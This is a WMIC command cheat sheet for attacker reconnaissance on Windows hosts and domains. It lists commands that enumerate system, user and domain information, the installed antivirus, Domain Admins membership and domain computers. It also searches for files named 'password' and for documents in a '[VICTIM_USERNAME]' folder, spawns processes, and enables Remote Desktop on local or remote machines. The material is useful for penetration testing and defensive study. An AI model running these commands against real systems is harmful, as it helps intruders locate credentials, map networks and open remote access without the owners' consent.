:: HOST Enumeration
:: --- OS Specifics ---
wmic OS get Caption,OSArchitecture,Version
wmic BIOS get Manufacturer,Name,SMBIOSBIOSVersion,Version
wmic CPU get Name,NumberOfCores,NumberOfLogicalProcessors
wmic NIC get Description,MACAddress,NetEnabled,Speed
wmic USERACCOUNT get Caption,Name,PasswordRequired,Status
wmic csproduct get vendor, version
wmic computersystem LIST full
wmic process get Name, executablepath, processid
wmic startup get Caption,Command,Location,User
wmic PRODUCT get Description,InstallDate,InstallLocation,Vendor,Version

:: --- Local User Accounts ---
wmic USERACCOUNT Get Domain,Name,Sid
wmic USERACCOUNT list full
wmic useraccount get /ALL


:: --- Netowrk Config ---
wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress

:: --- Anti-Virus ---
wmic /namespace:\\root\securitycenter2 path antivirusproduct

:: --- Directory Listing and File Search ---
:: wmic DATAFILE where "path='\\Users\\[VICTIM_USERNAME]'" GET Name,readable,size
:: wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE
wmic DATAFILE where "name like '%.doc'" get Name 
wmic DATAFILE where "name like '%.pdf'" get Name
:: wmic DATAFILE where "name like '%.xls'" get Name
:: wmic DATAFILE where "name like '%.xlsx'" get Name
:: wmic DATAFILE where "name like '%.docx'" get Name
:: wmic DATAFILE where "name like '%.ppt'" get Name

:: Domain Enumeration:
:: --- Domain and DC Info ---
wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE

:: --- Domain User Info ---
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='Admin'"

:: --- List All Users ---
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname

:: --- List All Groups ---
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname

::--- Members of A Group ---
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value

:: --- List All Computers ---
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname

:: Misc:
:: --- Execute Remote Command ---
wmic process call create "cmd.exe /c ping google.com"

:: --- Peripherals ---
wmic path Win32_PnPdevice 

:: --- Installed Updates ---
wmic qfe list brief

::--- Enable Remote Desktop ---
:: wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
:: OR
:: wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"